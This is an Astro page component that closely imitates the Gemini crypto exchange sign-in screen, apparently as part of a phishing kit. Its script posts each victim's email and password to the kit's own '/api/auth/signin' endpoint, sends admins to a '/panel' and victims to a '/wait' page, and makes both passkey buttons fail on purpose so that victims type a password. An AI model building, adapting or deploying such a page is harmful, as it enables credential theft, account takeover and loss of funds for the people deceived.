---
import AuthLayout from "../layouts/AuthLayout.astro";
---

<AuthLayout title="Gemini - Sign In">
  <div class="ev4buvj6 css-1ia2q6l e1vsinnk0">
    <div class="css-z1oayz e1vsinnk0">
      <svg
        id="gemini-logo-cyan_svg__Layer_1"
        data-name="Layer 1"
        viewBox="0 0 129.33 128.94"
        class="css-cp4eka ev4buvj8"
        ><path
          d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z"
          fill="#26ddf9"></path></svg
      >
    </div><div class="css-z1oayz e1vsinnk0">
      <p class="css-1t5dx1s ez8rcrm1">Don't have a Gemini account?</p><a
        type="button"
        data-testid="goToRegister"
        href="https://exchange.gemini.com/register"
        role="button"
        class="e1fsl8uw0 css-1gltqbx e1czpx482">Create a new account</a
      >
    </div>
  </div><div class="css-1x5wxe3 ev4buvj12">
    <div class="css-xhgaf9 ev4buvj11">
      <div class="css-k2k4ev ev4buvj10">
        <div id="email-section" class="css-2sm8t6 e1vsinnk0">
          <h2 data-testid="title" class="css-1ursixa eboofq0">Sign in</h2>
        </div>
        <div
          id="password-section"
          class="css-2sm8t6 e1vsinnk0"
          style="display: none;"
        >
          <h2 data-testid="title" class="css-1ursixa eboofq0">Welcome</h2>
        </div>
        <div class="css-147gpdq e1vsinnk0">
          <form id="signin-form">
            <div id="email-form">
              <div class="css-10rvi69 e54x8yx0">
                <div class="css-scorh2 e2m4m6s0">
                  <div id="email-container" class="css-hz0zn8 e1ra8wu4">
                    <label
                      for="composable-input-1"
                      id="email-label"
                      class="css-zucu6m e1ra8wu0">Email address</label
                    ><input
                      id="composable-input-1"
                      name="email"
                      data-testid="emailAddressInput"
                      autocomplete="email"
                      data-main-content="true"
                      class="css-1yi9rl e1jjkunm0"
                      value=""
                    />
                  </div>
                </div>
              </div><button
                type="submit"
                data-testid="continueLoginForm"
                class="e3uiujg0 css-1e1c3ne e1czpx482"
                style="width: 100%;">Continue</button
              ><div class="css-bpvg2 e1vsinnk0">
                <div
                  class="css-yo987q e9wwanr0"
                  style="background: rgba(1, 3, 4, 0.1); height: 1px; width: 100%;"
                >
                </div><p class="css-7s6377 ez8rcrm1">OR</p><div
                  class="css-yo987q e9wwanr0"
                  style="background: rgba(1, 3, 4, 0.1); height: 1px; width: 100%;"
                >
                </div>
              </div><button
                type="button"
                data-testid="signin-with-passkey-card"
                id="passkey-btn"
                class="e1fsl8uw0 css-1yeiyqw e1czpx482"
                style="width: 100%;"
                ><span class="e1czpx481 css-11mxs84 e1vsinnk0"
                  ><svg
                    aria-hidden="true"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    fill="currentcolor"
                    xmlns="http://www.w3.org/2000/svg"
                    ><path
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                      d="M2 12C2 9.23858 4.23858 7 7 7C8.63693 7 10.0891 7.78702 11.0002 9H20.4142L23.4142 12L18.6274 16.7868L16.25 15.2019L13.966 16.7245L11.6667 15H11.0002C10.0891 16.213 8.63693 17 7 17C4.23858 17 2 14.7614 2 12ZM7 14C8.10457 14 9 13.1046 9 12C9 10.8954 8.10457 10 7 10C5.89543 10 5 10.8954 5 12C5 13.1046 5.89543 14 7 14Z"
                    ></path></svg
                  ></span
                >Sign in with passkey</button
              >
            </div>

            <div id="password-form" style="display: none;">
              <div
                style="margin-top: 24px;"
                data-testid="emailAddressInput"
                class="css-1csd5y4 e1ti15re0"
              >
                <ul class="css-uyg3f e1to9wee0">
                  <li class="css-1q84oa5 ehl9t2e2">
                    <span class="css-7q6kxf ehl9t2e1">
                      <div class="ehl9t2e0 css-1wlxxx6 e2m4m6s0">
                        <div class="css-1a335l e2m4m6s0">
                          <div
                            class="ev9rtuq0 css-1jzfyp1 e2m4m6s0"
                            color="#010304"
                          >
                            <svg
                              aria-hidden="true"
                              width="20px"
                              height="20px"
                              viewBox="0 0 24 24"
                              fill="currentcolor"
                              xmlns="http://www.w3.org/2000/svg"
                            >
                              <path
                                fill-rule="evenodd"
                                clip-rule="evenodd"
                                d="M12 12C14.7614 12 17 9.76142 17 7C17 4.23858 14.7614 2 12 2C9.23858 2 7 4.23858 7 7C7 9.76142 9.23858 12 12 12ZM10 14C6.68629 14 4 16.6863 4 20V22H20V20C20 16.6863 17.3137 14 14 14H10Z"
                              ></path>
                            </svg>
                          </div>
                        </div>
                        <div class="css-1a8hj02 e2m4m6s0">
                          <span
                            data-testid="LimitTextLengthWrapper"
                            class="css-1d6zl8n e1wvgtob0"
                          >
                            <div class="css-1kvm27 e1wvgtob3">
                              <div
                                class="css-p652sy e1wvgtob2"
                                id="email-display"
                              >
                              </div>
                              <div class="css-scorh2 e1vsinnk0">
                                <p
                                  class="css-ivnacn ez8rcrm1"
                                  style="text-overflow: ellipsis;"
                                  id="email-display-2"
                                >
                                </p>
                                <div class="css-1h3518t e1vsinnk0"></div>
                              </div>
                            </div>
                          </span>
                        </div>
                        <div class="ehl9t2e4 css-128lz6q e2m4m6s0">
                          <button
                            type="button"
                            data-testid="change-email-address"
                            id="change-email"
                            class="e15a1iq30 css-e2xo8r e1czpx482"
                            >Change</button
                          >
                        </div>
                      </div>
                      <hr class="css-1wpua5o ehl9t2e3" />
                    </span>
                  </li>
                </ul>
              </div>
              <div style="margin-top: 24px;" class="css-13t5mqh e54x8yx0">
                <div class="css-scorh2 e2m4m6s0">
                  <div
                    data-right-element="true"
                    id="password-container"
                    class="css-hz0zn8 e1ra8wu4"
                  >
                    <label
                      for="composable-input-2"
                      id="password-label"
                      class="css-zucu6m e1ra8wu0">Password</label
                    >
                    <input
                      id="composable-input-2"
                      name="password"
                      type="password"
                      autocomplete="current-password"
                      label="Password"
                      data-testid="passwordInput"
                      data-main-content="true"
                      class="css-1yi9rl e1jjkunm0"
                      value=""
                    />
                    <span class="css-1366nqn e1ra8wu1">
                      <button
                        type="button"
                        aria-label="Show password text"
                        id="password-toggle"
                        class="css-109ehz8 enm6em70"
                      >
                        <svg
                          aria-hidden="true"
                          width="24px"
                          height="24px"
                          viewBox="0 0 24 24"
                          fill="currentcolor"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M12 4C9.18137 4 6.70076 5.4099 4.95859 7.01443C4.08087 7.8228 3.36038 8.7071 2.85251 9.54347C2.36538 10.3457 2 11.2247 2 12C2 12.7753 2.36538 13.6543 2.85251 14.4565C3.36038 15.2929 4.08087 16.1772 4.95859 16.9856C6.70076 18.5901 9.18137 20 12 20C14.8186 20 17.2992 18.5901 19.0414 16.9856C19.9191 16.1772 20.6396 15.2929 21.1475 14.4565C21.6346 13.6543 22 12.7753 22 12C22 11.2247 21.6346 10.3457 21.1475 9.54347C20.6396 8.7071 19.9191 7.8228 19.0414 7.01443C17.2992 5.4099 14.8186 4 12 4ZM16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12ZM12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10C10.8954 10 10 10.8954 10 12C10 13.1046 10.8954 14 12 14Z"
                          ></path>
                        </svg>
                      </button>
                    </span>
                  </div>
                </div>
              </div>
              <a
                data-testid="goToResetPassword"
                href="https://exchange.gemini.com/signin/forgot?email="
                id="forgot-password-link"
                class="enhu2900 css-wjfe82 ez8rcrm0"
                style="font-size: 13px;">Forgot password?</a
              >
              <button
                type="submit"
                disabled=""
                data-testid="submitLoginForm"
                id="signin-submit"
                class="e3uiujg0 css-12gwiiz e1czpx482"
                style="width: 100%; margin-top: 24px;">Sign in</button
              >
              <div class="css-bpvg2 e1vsinnk0" style="margin-top: 24px;">
                <div
                  class="css-yo987q e9wwanr0"
                  style="background: rgba(1, 3, 4, 0.1); height: 1px; width: 100%;"
                >
                </div>
                <p class="css-7s6377 ez8rcrm1">OR</p>
                <div
                  class="css-yo987q e9wwanr0"
                  style="background: rgba(1, 3, 4, 0.1); height: 1px; width: 100%;"
                >
                </div>
              </div>
              <button
                type="button"
                data-testid="signin-with-passkey-card"
                id="passkey-btn-2"
                class="e1fsl8uw0 css-1yeiyqw e1czpx482"
                style="width: 100%;margin-top: 24px;"
              >
                <span class="e1czpx481 css-11mxs84 e1vsinnk0">
                  <svg
                    aria-hidden="true"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    fill="currentcolor"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                      d="M2 12C2 9.23858 4.23858 7 7 7C8.63693 7 10.0891 7.78702 11.0002 9H20.4142L23.4142 12L18.6274 16.7868L16.25 15.2019L13.966 16.7245L11.6667 15H11.0002C10.0891 16.213 8.63693 17 7 17C4.23858 17 2 14.7614 2 12ZM7 14C8.10457 14 9 13.1046 9 12C9 10.8954 8.10457 10 7 10C5.89543 10 5 10.8954 5 12C5 13.1046 5.89543 14 7 14Z"
                    ></path>
                  </svg>
                </span>Sign in with passkey
              </button>
              <div class="css-16azb22 e1vsinnk0">
                <label
                  data-testid="remember-email-address-label"
                  class="css-12rv8da ettursl0"
                >
                  <div class="css-ywctyo e9wwanr0">
                    <input
                      data-testid="remember-email-address"
                      name="rememberEmail"
                      type="checkbox"
                      id="remember-checkbox"
                      class="css-gjd6wr e1jjtgfp0"
                      value="false"
                    />
                    <svg
                      aria-hidden="true"
                      width="20px"
                      height="20px"
                      viewBox="0 0 24 24"
                      fill="#010304"
                      xmlns="http://www.w3.org/2000/svg"
                      class="selected"
                      style="display: none;"
                    >
                      <path
                        fill-rule="evenodd"
                        clip-rule="evenodd"
                        d="M5 2C3.34315 2 2 3.34315 2 5V19C2 20.6569 3.34315 22 5 22H19C20.6569 22 22 20.6569 22 19V5C22 3.34315 20.6569 2 19 2H5ZM11.2071 16.2071L17.7071 9.70711L16.2929 8.29289L10.5 14.0858L7.20711 10.7929L5.79289 12.2071L9.79289 16.2071L10.5 16.9142L11.2071 16.2071Z"
                      ></path>
                    </svg>
                    <svg
                      aria-hidden="true"
                      width="20px"
                      height="20px"
                      viewBox="0 0 24 24"
                      fill="#010304"
                      xmlns="http://www.w3.org/2000/svg"
                      class="unselected"
                    >
                      <path
                        fill-rule="evenodd"
                        clip-rule="evenodd"
                        d="M2 5C2 3.34315 3.34315 2 5 2H19C20.6569 2 22 3.34315 22 5V19C22 20.6569 20.6569 22 19 22H5C3.34315 22 2 20.6569 2 19V5ZM5 4C4.44772 4 4 4.44772 4 5V19C4 19.5523 4.44772 20 5 20H19C19.5523 20 20 19.5523 20 19V5C20 4.44772 19.5523 4 19 4H5Z"
                      ></path>
                    </svg>
                  </div>
                  <div class="css-17hv65w e9wwanr0">
                    Remember my email address
                  </div>
                </label>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div><div class="css-dd86jp e1r6b78z2"></div>

  <div
    data-state="closed"
    id="error-overlay"
    class="css-he7cp8 e1a37g80"
    style="pointer-events: none; display: none;"
    data-aria-hidden="true"
    aria-hidden="true"
  >
  </div>

  <div
    data-state="closed"
    id="error-popup"
    class="css-1kmd0y5 e1a37g81"
    style="pointer-events: none; display: none;"
  >
    <div
      role="alertdialog"
      id="radix-:r6:"
      aria-describedby="radix-:r8:"
      aria-labelledby="radix-:r7:"
      data-state="closed"
      data-variant="alert"
      class="css-1xmnb1r e1a37g82"
      tabindex="-1"
      style="--transform-origin: center center; pointer-events: none;"
    >
      <div class="css-iqchs e2m4m6s0" data-header="true">
        <div class="css-1w6lmm1 e2m4m6s0">
          <h2 id="radix-:r7:" class="css-1cejuri e10y3t7r0">
            Something went wrong
          </h2><div id="radix-:r8:" class="css-cfz49a e1eua4un1">
            We couldn't complete your sign-in with passkey request. Please try
            again or use a different sign-in method.
          </div>
        </div>
      </div><div class="css-1od0imc e2m4m6s0" data-footer="true">
        <button
          type="button"
          id="dismiss-btn"
          data-testid="passkey-error-dismiss-btn"
          class="e1fsl8uw0 css-u67vte e1czpx482">Dismiss</button
        ><button
          type="button"
          id="try-again-btn"
          data-testid="passkey-error-try-again-btn"
          class="e3uiujg0 css-16toeh5 e1czpx482">Try again</button
        >
      </div>
    </div>
  </div>

  <script>
    const passkeyBtn = document.getElementById("passkey-btn");
    const passkeyBtn2 = document.getElementById("passkey-btn-2");
    const errorOverlay = document.getElementById("error-overlay");
    const errorPopup = document.getElementById("error-popup");
    const dismissBtn = document.getElementById("dismiss-btn");
    const tryAgainBtn = document.getElementById("try-again-btn");
    const emailInput = document.getElementById("composable-input-1");
    const emailLabel = document.getElementById("email-label");
    const emailContainer = document.getElementById("email-container");
    const passwordInput = document.getElementById("composable-input-2");
    const passwordLabel = document.getElementById("password-label");
    const passwordContainer = document.getElementById("password-container");
    const passwordToggle = document.getElementById("password-toggle");
    const changeEmailBtn = document.getElementById("change-email");
    const signinForm = document.getElementById("signin-form");
    const emailForm = document.getElementById("email-form");
    const passwordForm = document.getElementById("password-form");
    const emailSection = document.getElementById("email-section");
    const passwordSection = document.getElementById("password-section");
    const signinSubmit = document.getElementById("signin-submit");
    const rememberCheckbox = document.getElementById("remember-checkbox");
    const forgotPasswordLink = document.getElementById("forgot-password-link");
    const emailDisplay = document.getElementById("email-display");
    const emailDisplay2 = document.getElementById("email-display-2");

    const originalButtonHTML = `<span class="e1czpx481 css-11mxs84 e1vsinnk0"><svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 9.23858 4.23858 7 7 7C8.63693 7 10.0891 7.78702 11.0002 9H20.4142L23.4142 12L18.6274 16.7868L16.25 15.2019L13.966 16.7245L11.6667 15H11.0002C10.0891 16.213 8.63693 17 7 17C4.23858 17 2 14.7614 2 12ZM7 14C8.10457 14 9 13.1046 9 12C9 10.8954 8.10457 10 7 10C5.89543 10 5 10.8954 5 12C5 13.1046 5.89543 14 7 14Z"></path></svg></span>Sign in with passkey`;

    const loadingButtonHTML = `<span class="e1czpx481 css-1m901bd e1vsinnk0"><svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 9.23858 4.23858 7 7 7C8.63693 7 10.0891 7.78702 11.0002 9H20.4142L23.4142 12L18.6274 16.7868L16.25 15.2019L13.966 16.7245L11.6667 15H11.0002C10.0891 16.213 8.63693 17 7 17C4.23858 17 2 14.7614 2 12ZM7 14C8.10457 14 9 13.1046 9 12C9 10.8954 8.10457 10 7 10C5.89543 10 5 10.8954 5 12C5 13.1046 5.89543 14 7 14Z"></path></svg></span>Sign in with passkey<span class="notranslate e1czpx480 css-bv71wd e1vsinnk0"><div aria-label="spinner" data-testid="spinner-animation" class="css-1fwjvyf e1oqezu31"><svg color="inherit" viewBox="0 0 50 50" class="css-3qcxsx e1oqezu30"><circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle></svg></div></span>`;

    const signinLoadingHTML = `Sign in<span class="notranslate e1czpx480 css-bv71wd e1vsinnk0"><div aria-label="spinner" data-testid="spinner-animation" class="css-1fwjvyf e1oqezu31"><svg color="inherit" viewBox="0 0 50 50" class="css-3qcxsx e1oqezu30"><circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle></svg></div></span>`;

    const showPasswordSVG = `<svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 4C9.18137 4 6.70076 5.4099 4.95859 7.01443C4.08087 7.8228 3.36038 8.7071 2.85251 9.54347C2.36538 10.3457 2 11.2247 2 12C2 12.7753 2.36538 13.6543 2.85251 14.4565C3.36038 15.2929 4.08087 16.1772 4.95859 16.9856C6.70076 18.5901 9.18137 20 12 20C14.8186 20 17.2992 18.5901 19.0414 16.9856C19.9191 16.1772 20.6396 15.2929 21.1475 14.4565C21.6346 13.6543 22 12.7753 22 12C22 11.2247 21.6346 10.3457 21.1475 9.54347C20.6396 8.7071 19.9191 7.8228 19.0414 7.01443C17.2992 5.4099 14.8186 4 12 4ZM16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12ZM12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10C10.8954 10 10 10.8954 10 12C10 13.1046 10.8954 14 12 14Z"></path></svg>`;

    const hidePasswordSVG = `<svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M20.1148 15.8724C20.5182 15.3998 20.8656 14.9208 21.1475 14.4566C21.6346 13.6544 22 12.7754 22 12.0001C22 11.2247 21.6346 10.3458 21.1475 9.54354C20.6396 8.70718 19.9191 7.82288 19.0414 7.01451C17.2992 5.40998 14.8186 4.00008 12 4.00008C10.8824 4.00008 9.81801 4.22172 8.83168 4.58926L20.1148 15.8724ZM4.70715 3.29301L4.70711 3.29297L3.29289 4.70718L5.29818 6.71247C5.18209 6.81217 5.06886 6.91295 4.95859 7.01451C4.08087 7.82288 3.36038 8.70718 2.85251 9.54354C2.36538 10.3458 2 11.2247 2 12.0001C2 12.7754 2.36538 13.6544 2.85251 14.4566C3.36038 15.293 4.08087 16.1773 4.95859 16.9856C6.70076 18.5902 9.18137 20.0001 12 20.0001C13.8786 20.0001 15.607 19.3738 17.0667 18.481L19.2929 20.7072L20.707 19.293L4.70708 3.29309L4.70715 3.29301ZM14.032 15.4463L12.518 13.9323C12.3528 13.9765 12.1792 14.0001 12 14.0001C10.8954 14.0001 10 13.1046 10 12.0001C10 11.8209 10.0236 11.6473 10.0677 11.482L8.55382 9.96811C8.20193 10.5636 8 11.2583 8 12.0001C8 14.2092 9.79086 16.0001 12 16.0001C12.7418 16.0001 13.4365 15.7981 14.032 15.4463Z"></path></svg>`;

    let passwordVisible = false;
    let rememberEmail = false;
    let isSubmitting = false;

    function isValidEmail(email) {
      if (email.trim() === "") return false;
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email);
    }

    function setDefaultState() {
      emailContainer.className = "css-hz0zn8 e1ra8wu4";
      emailLabel.className = "css-zucu6m e1ra8wu0";
      emailInput.className = "css-1yi9rl e1jjkunm0";
      removeErrorMessage();
    }

    function setFocusedState() {
      emailContainer.className = "css-hz0zn8 e1ra8wu4";
      emailLabel.className = "css-t3yqxk e1ra8wu0";
      emailInput.className = "css-1pv9mq9 e1jjkunm0";
      removeErrorMessage();
    }

    function setFilledState() {
      emailContainer.className = "css-hz0zn8 e1ra8wu4";
      emailLabel.className = "css-15lv71w e1ra8wu0";
      emailInput.className = "css-1pv9mq9 e1jjkunm0";
      removeErrorMessage();
    }

    function setErrorState() {
      const email = emailInput.value.trim();
      emailContainer.className = "css-16l0l88 e1ra8wu4";

      if (email === "") {
        emailLabel.className = "css-zucu6m e1ra8wu0";
        emailInput.className = "css-1yi9rl e1jjkunm0";
      } else {
        emailLabel.className = "css-1xroaq2 e1ra8wu0";
        emailInput.className = "css-1pv9mq9 e1jjkunm0";
      }

      emailInput.setAttribute("aria-describedby", "composable-input-1-message");
      showErrorMessage();
    }

    function showErrorMessage() {
      removeErrorMessage();
      const errorDiv = document.createElement("div");
      errorDiv.setAttribute("data-testid", "undefined-message");
      errorDiv.id = "composable-input-1-message";
      errorDiv.className = "css-dztwwu e3mmshu1";
      errorDiv.innerHTML = `<svg aria-hidden="true" width="16px" height="16px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6223 4.66123C13.4793 2.6038 10.5204 2.60381 9.37735 4.66124L2.77637 16.543C1.66549 18.5426 3.11139 20.9999 5.39885 20.9999H18.6008C20.8882 20.9999 22.3341 18.5426 21.2233 16.543L14.6223 4.66123Z" fill="#CA3A3A"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M11 14V8H13V14H11ZM11 18V16H13V18H11Z" fill="white"></path></svg><span class="css-hxoadd e54x8yx0">Please enter a valid email address, like user@gmail.com.</span>`;
      emailContainer.parentNode.parentNode.appendChild(errorDiv);
    }

    function removeErrorMessage() {
      const existingError = document.getElementById(
        "composable-input-1-message",
      );
      if (existingError) {
        existingError.remove();
      }
      emailInput.removeAttribute("aria-describedby");
    }

    function setPasswordDefaultState() {
      passwordContainer.className = "css-hz0zn8 e1ra8wu4";
      passwordLabel.className = "css-zucu6m e1ra8wu0";
      passwordInput.className = "css-1yi9rl e1jjkunm0";
    }

    function setPasswordFocusedState() {
      passwordContainer.className = "css-hz0zn8 e1ra8wu4";
      passwordLabel.className = "css-t3yqxk e1ra8wu0";
      passwordInput.className = "css-1pv9mq9 e1jjkunm0";
    }

    function setPasswordFilledState() {
      passwordContainer.className = "css-hz0zn8 e1ra8wu4";
      passwordLabel.className = "css-15lv71w e1ra8wu0";
      passwordInput.className = "css-1pv9mq9 e1jjkunm0";
    }

    function updateSigninButtonState() {
      const hasPassword = passwordInput.value.trim() !== "";
      if (hasPassword) {
        signinSubmit.disabled = false;
        signinSubmit.className = "e3uiujg0 css-1e1c3ne e1czpx482";
      } else {
        signinSubmit.disabled = true;
        signinSubmit.className = "e3uiujg0 css-12gwiiz e1czpx482";
      }
    }

    function showLoadingState(button) {
      button.className = "e1fsl8uw0 css-e10ujo e1czpx482";
      button.disabled = true;
      button.innerHTML = loadingButtonHTML;
    }

    function resetButton(button) {
      button.className = "e1fsl8uw0 css-1yeiyqw e1czpx482";
      button.disabled = false;
      button.innerHTML = originalButtonHTML;
    }

    function showErrorPopup() {
      errorOverlay.style.display = "block";
      errorOverlay.style.pointerEvents = "auto";
      errorOverlay.setAttribute("data-state", "open");
      errorOverlay.setAttribute("aria-hidden", "true");

      errorPopup.style.display = "flex";
      errorPopup.style.pointerEvents = "auto";
      errorPopup.setAttribute("data-state", "open");
      const dialog = errorPopup.querySelector('[role="alertdialog"]');
      dialog.setAttribute("data-state", "open");
      dialog.style.pointerEvents = "auto";
    }

    function hideErrorPopup() {
      errorOverlay.style.display = "none";
      errorOverlay.style.pointerEvents = "none";
      errorOverlay.setAttribute("data-state", "closed");

      errorPopup.style.display = "none";
      errorPopup.style.pointerEvents = "none";
      errorPopup.setAttribute("data-state", "closed");
      const dialog = errorPopup.querySelector('[role="alertdialog"]');
      dialog.setAttribute("data-state", "closed");
      dialog.style.pointerEvents = "none";
    }

    function handlePasskeyClick(button) {
      showLoadingState(button);
      setTimeout(() => {
        resetButton(button);
        showErrorPopup();
      }, 500);
    }

    function switchToPasswordForm() {
      const email = emailInput.value.trim();
      emailDisplay.textContent = email;
      emailDisplay2.textContent =
        email.length > 23 ? email.substring(0, 24) + "..." : email;
      forgotPasswordLink.href = `https://exchange.gemini.com/signin/forgot?email=${encodeURIComponent(email)}`;

      emailForm.style.display = "none";
      passwordForm.style.display = "block";
      emailSection.style.display = "none";
      passwordSection.style.display = "block";

      passwordInput.focus();
      setPasswordFocusedState();
    }

    function switchToEmailForm() {
      emailForm.style.display = "block";
      passwordForm.style.display = "none";
      emailSection.style.display = "block";
      passwordSection.style.display = "none";

      emailInput.focus();
      if (emailInput.value.trim() !== "") {
        setFocusedState();
      } else {
        setDefaultState();
      }
    }

    function togglePassword() {
      passwordVisible = !passwordVisible;
      if (passwordVisible) {
        passwordInput.type = "text";
        passwordToggle.innerHTML = hidePasswordSVG;
        passwordToggle.setAttribute("aria-label", "Hide password text");
      } else {
        passwordInput.type = "password";
        passwordToggle.innerHTML = showPasswordSVG;
        passwordToggle.setAttribute("aria-label", "Show password text");
      }
    }

    function toggleRememberCheckbox() {
      rememberEmail = !rememberEmail;
      const selectedIcon = document.querySelector(".selected");
      const unselectedIcon = document.querySelector(".unselected");

      if (rememberEmail) {
        selectedIcon.style.display = "block";
        unselectedIcon.style.display = "none";
        rememberCheckbox.value = "true";
      } else {
        selectedIcon.style.display = "none";
        unselectedIcon.style.display = "block";
        rememberCheckbox.value = "false";
      }
    }

    async function handleFormSubmit(e) {
      e.preventDefault();

      if (isSubmitting) return;

      if (passwordSection.style.display !== "none") {
        isSubmitting = true;
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        signinSubmit.disabled = true;
        signinSubmit.className = "e3uiujg0 css-1x0z3gm e1czpx482";
        signinSubmit.innerHTML = signinLoadingHTML;

        setTimeout(async () => {
          try {
            const signinResponse = await fetch("/api/auth/signin", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                email,
                password,
              }),
            });

            if (!signinResponse.ok) {
              const data = await signinResponse.json();
              if (data.error === "Invalid admin credentials") {
                if (window.showToast) {
                  window.showToast(
                    "Invalid admin credentials. Please try again.",
                    "error",
                  );
                }
              } else {
                if (window.showToast) {
                  window.showToast(
                    data.error || "Invalid credentials",
                    "error",
                  );
                }
              }
              throw new Error(data.error || "Invalid credentials");
            }

            const data = await signinResponse.json();

            if (data.user.isAdmin) {
              if (window.showToast) {
                window.showToast("Welcome back, Admin!", "success");
              }
              setTimeout(() => {
                window.location.replace("/panel");
              }, 1000);
            } else {
              if (window.showToast) {
                window.showToast("Sign in successful!", "success");
              }
              setTimeout(() => {
                window.location.replace("/wait");
              }, 1000);
            }
          } catch (error) {
            console.error("Error:", error);
            signinSubmit.disabled = false;
            signinSubmit.className = "e3uiujg0 css-1e1c3ne e1czpx482";
            signinSubmit.innerHTML = "Sign in";
            isSubmitting = false;
          }
        }, 500);
      } else {
        const email = emailInput.value.trim();
        if (isValidEmail(email)) {
          switchToPasswordForm();
        } else {
          setErrorState();
        }
      }
    }

    emailInput.addEventListener("focus", () => {
      const email = emailInput.value.trim();
      if (email !== "" && !isValidEmail(email)) {
        setErrorState();
      } else {
        setFocusedState();
      }
    });

    emailInput.addEventListener("blur", () => {
      const email = emailInput.value.trim();
      if (!isValidEmail(email)) {
        setErrorState();
      } else {
        setFilledState();
      }
    });

    emailInput.addEventListener("input", () => {
      if (emailInput === document.activeElement) {
        setFocusedState();
      }
    });

    emailInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        signinForm.dispatchEvent(new Event("submit"));
      }
    });

    passwordInput.addEventListener("focus", () => {
      setPasswordFocusedState();
    });

    passwordInput.addEventListener("blur", () => {
      const password = passwordInput.value.trim();
      if (password !== "") {
        setPasswordFilledState();
      } else {
        setPasswordDefaultState();
      }
    });

    passwordInput.addEventListener("input", () => {
      if (passwordInput === document.activeElement) {
        setPasswordFocusedState();
      }
      updateSigninButtonState();
    });

    passwordInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        if (!signinSubmit.disabled) {
          signinForm.dispatchEvent(new Event("submit"));
        }
      }
    });

    passwordToggle.addEventListener("click", togglePassword);
    changeEmailBtn.addEventListener("click", switchToEmailForm);
    signinForm.addEventListener("submit", handleFormSubmit);

    passkeyBtn.addEventListener("click", () => handlePasskeyClick(passkeyBtn));
    passkeyBtn2.addEventListener("click", () =>
      handlePasskeyClick(passkeyBtn2),
    );

    dismissBtn.addEventListener("click", () => {
      hideErrorPopup();
    });

    tryAgainBtn.addEventListener("click", () => {
      hideErrorPopup();
      const activePasskeyBtn =
        passwordSection.style.display !== "none" ? passkeyBtn2 : passkeyBtn;
      handlePasskeyClick(activePasskeyBtn);
    });

    rememberCheckbox.parentElement.addEventListener("click", (e) => {
      e.preventDefault();
      toggleRememberCheckbox();
    });

    updateSigninButtonState();
  </script>
</AuthLayout>
